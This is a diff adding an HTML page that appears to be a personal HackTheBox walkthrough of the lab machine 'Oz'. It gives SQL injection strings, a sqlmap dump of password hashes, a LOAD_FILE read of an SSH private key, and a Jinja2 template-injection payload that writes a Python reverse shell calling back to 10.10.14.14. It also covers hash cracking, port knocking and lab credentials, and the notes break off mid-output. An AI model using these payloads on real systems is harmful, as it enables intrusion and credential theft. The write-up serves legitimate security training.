@@ -1,0 +1,948 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>DocDock Documentation</title>
+    
+      <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="revised" content="2019-01-21T12:00:28 EST">
+<title>Oz :: DocDock Documentation</title>
+<link rel="shortcut icon" href="/images/favicon.png" type="image/x-icon" />
+<link href="/css/font-awesome.min.css" rel="stylesheet">
+<link href="/css/nucleus.css" rel="stylesheet">
+<link href="/theme-flex/style.css" rel="stylesheet">
+
+	<link href="/theme-flex/variant-red.css" rel="stylesheet">
+
+<link rel="stylesheet" href="/css/bootstrap.min.css">
+<script src="/js/jquery-2.x.min.js"></script>
+<script type="text/javascript">
+      var baseurl = "\/";
+</script>
+<meta name="description" content="">
+
+
+
+    
+  </head>
+  <body data-url="/hackthebox/boxes/oz/">
+    
+      <header>
+  <div class="logo">
+    
+
+
+
+
+<h2 id="chickenpwny">ChickenPwny</h2>
+
+
+
+
+  </div>
+  <div class="burger"><a href="javascript:void(0);" style="font-size:15px;">&#9776;</a></div>
+    <nav class="shortcuts">
+            <li class="" role="">
+                <a href="https://twitter.com/chickenpwny"  rel="noopener">
+                  <i class='fa fa-twitter'></i> <label>Twitter</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock"  rel="noopener">
+                  <i class='fa fa-github'></i> <label>Github repo</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="https://github.com/vjeantet/hugo-theme-docdock/archive/master.zip"  rel="noopener">
+                  <i class='fa fa-cloud-download'></i> <label>Download</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="#"  rel="noopener">
+                  <i class='fa fa-bookmark'></i> <label>Book Mark</label>
+                </a>
+            </li>
+            <li class="" role="">
+                <a href="/credits"  rel="noopener">
+                  <i class='fa fa-bullhorn'></i> <label>Credits</label>
+                </a>
+            </li>
+    </nav>
+</header>
+<article>
+  <aside>
+    <ul class="menu">
+<a href="http://chickenpwny.github.io"><img src="/images/chickenpwny2.jpg" alt="Alternate Text" style="width:45%;margin-left:auto;margin-right:auto;border-radius:50%;display:block;" alt="Home"/></a>
+<li data-nav-id="/concepts/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/">Concept</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/">WebAppPenTests</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/concepts/webapppentest/lfi/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/lfi/"> Local File inclusion</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/heartbld/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/heartbld/">HeartBleed</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/osinjcmd/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/osinjcmd/">OS Command Injection</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/concepts/webapppentest/phptypejuggling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/concepts/webapppentest/phptypejuggling/">PHP Typw Juggling</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/github/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/github/">GitHub</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/github/hugopowershell/" class="dd-item">
+    <div>
+        <a href="/github/hugopowershell/">
+            Hugo/Github/Power
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/">HackTheBox</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/" class="dd-item parent haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/">Boxes</a>
+        <i class="fa fa-angle-down fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/boxes/hawk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/hawk/"></a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/blue/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/blue/">Blue</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/crimestoppers/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/crimestoppers/">CrimeStopper</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/mischief/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/mischief/">Mischief</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/oz/" class="dd-item parent active
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/oz/">Oz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/poison/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/poison/">Poison</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/secnotes/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/secnotes/">SecNotes</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/valentine/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/valentine/">Valentine</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/waldo/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/waldo/">Waldo</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/hackthebox/boxes/sunday/" class="dd-item
+        ">
+    <div>
+
+        <a href="/hackthebox/boxes/sunday/">sunday</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/hackthebox/challenges/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/hackthebox/challenges/">Miscellaneous</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/hackthebox/challenges/bloodhound/" class="dd-item">
+    <div>
+        <a href="/hackthebox/challenges/bloodhound/">
+            
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/help/" class="dd-item
+        ">
+    <div>
+
+        <a href="/help/">Network Manager Down</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/">Tools</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/bloodhound/" class="dd-item">
+    <div>
+        <a href="/tools/bloodhound/">
+            BloodHound Neo4j
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/ftp/" class="dd-item">
+    <div>
+        <a href="/tools/ftp/">
+            FTP
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/portscanning/">PortScannings</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/portscanning/netcat/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/netcat/">NetCat PORT SCAN</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/portscanning/nmap/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/portscanning/nmap/">Nmap</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/snmpwalk/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/snmpwalk/">SNMPWalk</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/webapp/">WebApps</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/webapp/burp/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/burp/">Burp</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/gobuster/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/gobuster/">GoBuster</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/sqlmap/sqlmap/" class="dd-item">
+    <div>
+        <a href="/tools/webapp/sqlmap/sqlmap/">
+            SqlMap
+        </a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+<li data-nav-id="/tools/webapp/wfuzz/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/webapp/wfuzz/">WFuzz</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+<li data-nav-id="/tools/ssh/" class="dd-item haschildren
+        ">
+    <div>
+
+        <a href="/tools/ssh/">ssh</a><i class="fa fa-angle-right fa-lg category-icon"></i><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+    <ul>
+<li data-nav-id="/tools/ssh/sshtunnling/" class="dd-item
+        ">
+    <div>
+
+        <a href="/tools/ssh/sshtunnling/">SSHuttle</a><i class="fa fa-circle-thin read-icon"></i>
+    </div>
+</li>
+    </ul>
+</li>
+    </ul>
+</li>
+
+
+
+    </ul>
+    <section>
+    </section>
+  </aside>
+  <section class="page">
+    
+    <div class="nav-select">
+      <center>Navigation : 
+        <select onchange="javascript:location.href = this.value;">
+          
+    <option value="/concepts/" >
+   Concept</option>
+    <option value="/github/" >
+   GitHub</option>
+    <option value="/hackthebox/" >
+   HackTheBox</option> 
+    <option value="/hackthebox/boxes/" >
+  - 
+   Boxes</option> 
+    <option value="/hackthebox/boxes/hawk/" >
+  -- 
+   </option>
+    <option value="/hackthebox/boxes/blue/" >
+  -- 
+   Blue</option>
+    <option value="/hackthebox/boxes/crimestoppers/" >
+  -- 
+   CrimeStopper</option>
+    <option value="/hackthebox/boxes/mischief/" >
+  -- 
+   Mischief</option>
+    <option value="/hackthebox/boxes/oz/"  selected>
+  -- 
+   Oz</option> 
+  
+    <option value="/hackthebox/boxes/poison/" >
+  -- 
+   Poison</option>
+    <option value="/hackthebox/boxes/secnotes/" >
+  -- 
+   SecNotes</option>
+    <option value="/hackthebox/boxes/valentine/" >
+  -- 
+   Valentine</option>
+    <option value="/hackthebox/boxes/waldo/" >
+  -- 
+   Waldo</option>
+    <option value="/hackthebox/boxes/sunday/" >
+  -- 
+   sunday</option>
+  
+    <option value="/hackthebox/challenges/" >
+  - 
+   Miscellaneous</option>
+  
+    <option value="/help/" >
+   Network Manager Down</option>
+    <option value="/tools/" >
+   Tools</option>
+
+
+
+        </select>
+      </center>
+    </div>
+      <div>
+        <div class="searchbox">
+          <input data-search-input id="search-by" type="text" placeholder="Search...">
+        </div>
+        <script type="text/javascript" src="/js/lunr.min.js"></script>
+        <script type="text/javascript" src="/js/auto-complete.js"></script>
+        <link href="/css/auto-complete.css" rel="stylesheet">
+        <script type="text/javascript">
+          
+              var baseurl = "\/";
+          
+        </script>
+        <script type="text/javascript" src="/js/search.js"></script>
+      </div>
+    
+
+    <h1>Oz</h1>
+    
+    
+    
+
+
+
+<p>{{ button href=&ldquo;<a href="https://www.youtube.com/watch?v=yX00n1UmalE&quot;">https://www.youtube.com/watch?v=yX00n1UmalE&quot;</a> theme=&ldquo;danger&rdquo; }} IppSec {{ /button }}</p>
+
+<p>NMAP</p>
+
+<p>two ports 80 &amp; 8080</p>
+
+<pre><code>nmap -sC -sV -oA nmap/oz-initial 10.10.10.96 -T4
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 11:18 EST
+Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 0.00% done
+Nmap scan report for 10.10.10.96
+Host is up (0.041s latency).
+Not shown: 998 filtered ports
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+|_http-title: OZ webapi
+|_http-trane-info: Problem with XML parsing of /evox/about
+8080/tcp open  http    Werkzeug httpd 0.14.1 (Python 2.7.14)
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-server-header: Werkzeug/0.14.1 Python/2.7.14
+| http-title: GBR Support - Login
+|_Requested resource was http://10.10.10.96:8080/login
+
+modify the host header 
+</code></pre>
+
+<p>host: please subscribe.</p>
+
+<p>gobuster using the -l switch will filter out matching lengths.</p>
+
+<p>using options in the request method in burp will give you the supported request. neat</p>
+
+<p><img src="https://chickenpwny.github.io/images//oz/request-options.PNG" alt="request-options" /></p>
+
+<p><img src="https://chickenpwny.github.io/images/oz/request-options-login.PNG" alt="request-options-login" /></p>
+
+<p>Using wfuzz to enumerate the webapi filter header lengths of 0</p>
+
+<pre><code>wfuzz --hl 0 -u http://oz.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-lis
+t-2.3-medium.txt     
+returns
+000202:  C=200      3 L        6 W           79 Ch        &quot;users&quot;
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/oz/webapi.PNG" alt="webapi" /></p>
+
+<p>sqlmap &ndash;batch -u &ldquo;<a href="http://os.htb/users/admin*&quot;">http://os.htb/users/admin*&quot;</a> &ndash;level 5 &ndash;risk 3</p>
+
+<p>-u url also for get request</p>
+
+<p>&ndash;batch run default yes</p>
+
+<p>&ndash;* = the parameter to fuzz</p>
+
+<p><img src="https://chickenpwny.github.io/images/oz/sqlinjection2.PNG" alt="sqlinjection2" /></p>
+
+<p>I do love to watch sqlmap scroll down the screen.</p>
+
+<p>sqlmap &ndash;batch -u &ldquo;<a href="http://os.htb/users/admin*&quot;">http://os.htb/users/admin*&quot;</a> &ndash;level 5 &ndash;risk 3 &ndash;dump</p>
+
+<pre><code>Database: ozdb      
+Table: users_gbw             
+[6 entries]                                                                                                                                         
++----+-------------+----------------------------------------------------------------------------------------+                                       
+| id | username    | password                                                                               |                                       
++----+-------------+----------------------------------------------------------------------------------------+                                       
+| 1  | dorthi      | $pbkdf2-sha256$5000$aA3h3LvXOseYk3IupVQKgQ$ogPU/XoFb.nzdCGDulkW3AeDZPbK580zeTxJnG0EJ78 |                                       
+| 2  | tin.man     | $pbkdf2-sha256$5000$GgNACCFkDOE8B4AwZgzBuA$IXewCMHWhf7ktju5Sw.W.ZWMyHYAJ5mpvWialENXofk |                                       
+| 3  | wizard.oz   | $pbkdf2-sha256$5000$BCDkXKuVMgaAEMJ4z5mzdg$GNn4Ti/hUyMgoyI7GKGJWeqlZg28RIqSqspvKQq6LWY |                                       
+| 4  | coward.lyon | $pbkdf2-sha256$5000$bU2JsVYqpbT2PqcUQmjN.Q$hO7DfQLTL6Nq2MeKei39Jn0ddmqly3uBxO/tbBuw4DY |                                       
+| 5  | toto        | $pbkdf2-sha256$5000$Zax17l1Lac25V6oVwnjPWQ$oTYQQVsuSz9kmFggpAWB0yrKsMdPjvfob9NfBq4Wtkg |                                       
+| 6  | admin       | $pbkdf2-sha256$5000$d47xHsP4P6eUUgoh5BzjfA$jWgyYmxDK.slJYUTsv9V9xZ3WWwcl9EBOsz.bARwGBQ |       
+
+Database: ozdb
+Table: tickets_gbw
+[12 entries]
++----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+| id | name     | desc                                                                                                                           |
++----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+| 1  | GBR-987  | Reissued new id_rsa and id_rsa.pub keys for ssh access to dorthi.                                                              |
+| 2  | GBR-1204 | Where did all these damn monkey's come from!?  I need to call pest control.                                                    |
+| 3  | GBR-1205 | Note to self: Toto keeps chewing on the curtain, find one with dog repellent.                                                  |
+| 4  | GBR-1389 | Nothing to see here... V2hhdCBkaWQgeW91IGV4cGVjdD8=                                                                            |
+| 5  | GBR-4034 | Think of a better secret knock for the front door.  Doesn't seem that secure, a Lion got in today.                             |
+| 6  | GBR-5012 | I bet you won't read the next entry.                                                                                           |
+| 7  | GBR-7890 | HAHA! Made you look.                                                                                                           |
+| 8  | GBR-7945 | Dorthi should be able to find her keys in the default folder under /home/dorthi/ on the db.                                    |
+| 9  | GBR-8011 | Seriously though, WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4= |
+| 10 | GBR-8042 | You are just wasting time now... someone else is getting user.txt                                                              |
+| 11 | GBR-8457 | Look... now they've got root.txt and you don't even have user.txt                                                              |
+| 12 | GBR-9872 | db information loaded to ticket application for shared db access                                                               |
++----+----------+--------------------------------------------------------------------------------------------------------------------------------+
+
+</code></pre>
+
+<p>V2hhdCBkaWQgeW91IGV4cGVjdD8</p>
+
+<p>What did you expecd</p>
+
+<p>WW91J3JlIGp1c3QgdHJ5aW5nIHRvbyBoYXJkLi4uIG5vYm9keSBoaWRlcyBhbnl0aGluZyBpbiBiYXNlNjQgYW55bW9yZS4uLiBjJ21vbi4=</p>
+
+<p>You&rsquo;re just trying too hard&hellip; nobody hides anything in base64 anymore&hellip; c&rsquo;mon.</p>
+
+<p>union injections</p>
+
+<p>%20 is url space</p>
+
+<p>users/admin&rsquo;&ndash;+- ==== 500 error</p>
+
+<p>users/admin&rsquo;&ndash;%20- ===works</p>
+
+<p><img src="https://chickenpwny.github.io/images/oz/sqlinjection3-url.PNG" alt="sqlinjection3-url" /></p>
+
+<p>&lsquo;or 1&rsquo;=1 url encoded looks like this &lsquo;%20or%201=&lsquo;1</p>
+
+<p>1 is the first user in the database to get the other users we have to go down the table</p>
+
+<p><img src="https://chickenpwny.github.io/images/oz/sqlinjection3-url2.PNG" alt="sqlinjection3-url2" /></p>
+
+<p>go into the user functions</p>
+
+<pre><code>'%20limit%201,1--%20-'
+'%20or%201='1'%20limit%202,1--%20-'
+</code></pre>
+
+<p><img src="https://chickenpwny.github.io/images/oz/sqlinjection3-url3.PNG" alt="sqlinjection3-url3" /></p>
+
+<p>changing the row in column one will go down the list</p>
+
+<pre><code>'%20or%201='1'%20limit%203,1--%20-'     output  {&quot;username&quot;:&quot;tin.man&quot;}
+'%20or%201='1'%20limit%202,1--%20-'     output      {&quot;username&quot;:&quot;wizard.oz&quot;}
+'%20or%201='1'%20limit%203,1--%20-'     output  {&quot;username&quot;:&quot;coward.lyon&quot;}
+'%20or%201='1'%20limit%204,1--%20-'     output  {&quot;username&quot;:&quot;toto&quot;}
+'%20or%201='1'%20limit%205,1--%20-'     output  {&quot;username&quot;:&quot;admin&quot;}
+the sixth is null
+</code></pre>
+
+<p>The password should be the seocnd column</p>
+
+<p>union select burp</p>
+
+<p>GET /users/chicken&rsquo;%20union%20select%20all%20user()&ndash;%20- HTTP/1.1</p>
+
+<p>{&ldquo;username&rdquo;:&ldquo;dorthi@10.100.10.6&rdquo;}</p>
+
+<p>LOAD_FILE</p>
+
+<p>GET /users/chicken&rsquo;%20union%20select%20all%20LOAD_FILE(&lsquo;home/&rsquo;)&ndash;%20- HTTP/1.1</p>
+
+<p>importing the binascii library to convert the text into a hex format</p>
+
+<p>python3</p>
+
+<blockquote>
+<blockquote>
+<blockquote>
+<p>import binascii
+binascii.hexlify(&ldquo;/home/dorthi/.ssh/id_rsa&rdquo;)
+Traceback (most recent call last):
+  File &ldquo;<stdin>&rdquo;, line 1, in <module>
+TypeError: a bytes-like object is required, not &lsquo;str&rsquo;
+binascii.hexlify(b&rdquo;/home/dorthi/.ssh/id_rsa&rdquo;)
+b&rsquo;2f686f6d652f646f727468692f2e7373682f69645f727361&rsquo;
+exit</p>
+</blockquote>
+</blockquote>
+</blockquote>
+
+<p>burp getting usershells</p>
+
+<p>python running the backend because when you run 7*&lsquo;7&rsquo; it prints 7 7&rsquo;s</p>
+
+<p><img src="https://chickenpwny.github.io/images/oz/sqlinjection3-url4.PNG" alt="sqlinjection3-url4" /></p>
+
+<p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections</a></p>
+
+<p>Load</p>
+
+<p>name=chicken&amp;desc={{ config.from_pyfile(&lsquo;/tmp/chicken.cfg&rsquo;) }}</p>
+
+<p>write</p>
+
+<p>name=chicken&amp;desc={{ &ldquo;.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[40](&lsquo;/tmp/chicken.cfg&rsquo;, &lsquo;w&rsquo;).write(&lsquo;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&ldquo;10.10.14.14&rdquo;,9051));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;]);&lsquo;) }}</p>
+
+<p>read</p>
+
+<p>name=chicken&amp;desc={{ &ldquo;.<strong>class</strong>.<strong>mro</strong>[2].<strong>subclasses</strong>()[40](&lsquo;/tmp/chicken.cfg&rsquo;).read() }}</p>
+
+<p>GET /users/chicken&rsquo;%20union%20select%20all%20LOAD_FILE(0x2f686f6d652f646f727468692f2e7373682f69645f727361)&ndash;%20-</p>
+
+<p>HASHCAT</p>
+
+<p>hashcat -a 0 -m 10000 clean.hashes /opt/htb/wordlist/rockyou.txt</p>
+
+<p>Django (PBKDF2-SHA256)</p>
+
+<p>10000</p>
+
+<pre><code>cat users.hashes |awk -F, '{print $4}' or 2 or 3 depends
+</code></pre>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20injections</a></p>
+
+<p>testing for whats working on the back end</p>
+
+<p>wizardofoz22</p>
+
+<p>python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;</p>
+
+<p>python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/sh&rdquo;)&rsquo;</p>
+
+<p>crtl+z , then type stty raw-echo, crtl+z then type reset</p>
+
+<p>cat knockd.conf
+[options]
+        logfile = /var/log/knockd.log</p>
+
+<p>[opencloseSSH]</p>
+
+<pre><code>    sequence        = 40809:udp,50212:udp,46969:udp
+    seq_timeout     = 15
+    start_command   = ufw allow from %IP% to any port 22
+    cmd_timeout     = 10
+    stop_command    = ufw delete allow from %IP% to any port 22
+    tcpflags        = syn
+</code></pre>
+
+<p>for i in 40809 50212 46969; do nc -zu oz.htb $i ;done</p>
+
+<p>inside tickerter database.py hardcoded creds</p>
+
+<p>dorthi:N0Pl4c3L1keH0me@10.100.10.4/ozdb</p>
+
+<p>mysql -u dorthi -p -h 10.100.10.4</p>
+
+<p>ssh</p>
+
+<p>openssl rsa -in dorthi_key -out dorthi.ssh</p>
+
+<p>some how all of that comes together to give produce ssh connection. first i believe ssh is open but only response to a tcp connection. so when you knock these three ports in a row it will open up a ssh conneciton for 10 seconds then close it. the for loop run through the three port variables and</p>
+
+<h3 id="sudo-l">sudo -l</h3>
+
+<p>Matching Defaults entries for dorthi on Oz:
+    env_reset, mail_badpass,
+    N0Pl4c3L1keH0me</p>
+
+<p>secure_path=/usr/local/sbin/:/usr/local/bin/:/usr/sbin/:/usr/bin/:/sbin/:/bin/:/snap/bin</p>
+
+<p>User dorthi may run the following commands on Oz:
+    (ALL) NOPASSWD: /usr/bin/docker network inspect *
+    (ALL) NOPASSWD: /usr/bin/docker network ls</p>
+
+<p>sudo docker network ls</p>
+
+<p>sudo docker network ls
+NETWORK ID          NAME                DRIVER              SCOPE
+4e64c670965c        bridge              bridge              local
+49c1b0c16723        host                host                local
+3ccc2aa17acf        none                null                local
+48148eb6a512        prodnet             bridge              local</p>
+
+<p>sudo docker network inspect</p>
+
+<p>webapi</p>
+
+<p>ozdb</p>
+
+<p>tix-app</p>
+
+<p>cd/containers/database</p>
+
+<p>found in start.sh</p>
+
+<p>ROOT_PASSWORD=SuP3rS3cr3tP@ss</p>
+
+<pre><code>
+&quot;Containers&quot;: {                                                      &quot;139ba9457f1a630ee3a072693999c414901d7df49ab8a70b926d246f9ca6cc69&quot;: {                                                               
+                &quot;Name&quot;: &quot;webapi&quot;,                                 
+                &quot;EndpointID&quot;: &quot;f3555ebb0f7e0571b0667b260ff809b392f3eeffd1a0d4d24643132295676ad3&quot;,                                                   
+                &quot;MacAddress&quot;: &quot;02:42:0a:64:0a:06&quot;,                 
+                &quot;IPv4Address&quot;: &quot;10.100.10.6/29&quot;,                   
+                &quot;IPv6Address&quot;: &quot;&quot;                                 
+            },                                                     &quot;b9b370edd41a9d3ae114756d306f2502c420f48a4d7fbe36ae31bc18cf7ddb7c&quot;: {                                                               
+                &quot;Name&quot;: &quot;ozdb&quot;,                                   
+                &quot;EndpointID&quot;: &quot;be4bcb170ed830949e764b336a98c3c4b072cfa906bde1a1d437d44562056c17&quot;,                                                   
+                &quot;MacAddress&quot;: &quot;02:42:0a:64:0a:04&quot;,                 
+                &quot;IPv4Address&quot;: &quot;10.100.10.4/29&quot;,                   
+                &quot;IPv6Address&quot;: &quot;&quot;
+            },
+            &quot;c26a7bc669289e40144fa1ad25546f38e4349d964b7b3d4fea13e15fe5a9fb01&quot;: {
+                &quot;Name&quot;: &quot;tix-app&quot;,
+                &quot;EndpointID&quot;: &quot;25e5afcafe2a6e98bf3dbe016106d0587a2a4986985e7d4795b2e48c213aadf1&quot;,
+                &quot;MacAddress&quot;: &quot;02:42:0a:64:0a:02&quot;,
+                &quot;IPv4Address&quot;: &quot;10.100.10.2/29&quot;,
+                &quot;IPv6Address&quot;: &quot;&quot;
+            }
+</code></pre>
+
+<h3 id="bridge">BRIDGE</h3>
+
+<pre><code>                }
+            ]
+        },
+        &quot;Internal&quot;: false,
+        &quot;Attachable&quot;: false,
+        &quot;Containers&quot;: {
+            &quot;e267fc4f305575070b1166baf802877cb9d7c7c5d7711d14bfc2604993b77e14&quot;: {
+                &quot;Name&quot;: &quot;portainer-1.11.1&quot;,
+                &quot;EndpointID&quot;: &quot;0f02aa142cdda63ddbc41be13e1716e9d8b1f0747a4abe4f47cd96dc593743c8&quot;,                                                   
+                &quot;MacAddress&quot;: &quot;02:42:ac:11:00:02&quot;,
+                &quot;IPv4Address&quot;: &quot;172.17.0.2/16&quot;,
+                &quot;IPv6Address&quot;: &quot;&quot;
+            }
+        },
+        &quot;Options&quot;: {
+            &quot;com.docker.network.bridge.default_bridge&quot;: &quot;true&quot;,
+            &quot;com.docker.network.bridge.enable_icc&quot;: &quot;true&quot;,
+            &quot;com.docker.network.bridge.enable_ip_masquerade&quot;: &quot;true&quot;,
+            &quot;com.docker.network.bridge.host_binding_ipv4&quot;: &quot;0.0.0.0&quot;,
+            &quot;com.docker.network.bridge.name&quot;: &quot;docker0&quot;,
+            &quot;com.docker.network.driver.mtu&quot;: &quot;1500&quot;
+        },
+        &quot;Labels&quot;: {}
+</code></pre>
+
+<h3 id="nmap">NMAP</h3>
+
+<pre><code>nmap -sT -T5 172.17.02
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2019-01-21 09:13 CST
+Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Ping Scan Timing: About 100.00% done; ETC: 09:13 (0:00:00 remaining)
+Stats: 0:00:01 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Parallel DNS resolution of 1 host. Timing: About 0.00% done
+Nmap scan report for 172.17.02 (172.17.0.2)
+Host is up (0.00017s latency).
+Not shown: 999 closed ports
+PORT     STATE SERVICE
+9000/tcp open  cslistener
+</code></pre>
+
+<h3 id="proxychain-nmap">Proxychain Nmap</h3>
+
+<p>using ~C capitcal c trick then use proxychain make sure to turn off dns and turn on quite-mode</p>
+
+<pre><code>proxychains nmap -sT 172.17.0.2 -Pn --open -T4                                  
+ProxyChains-3.1 (http://proxychains.sf.net)
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-20 17:52 EST                                              
+Nmap scan report for 172.17.0.2
+Host is up (0.044s latency).
+Not shown: 999 closed ports
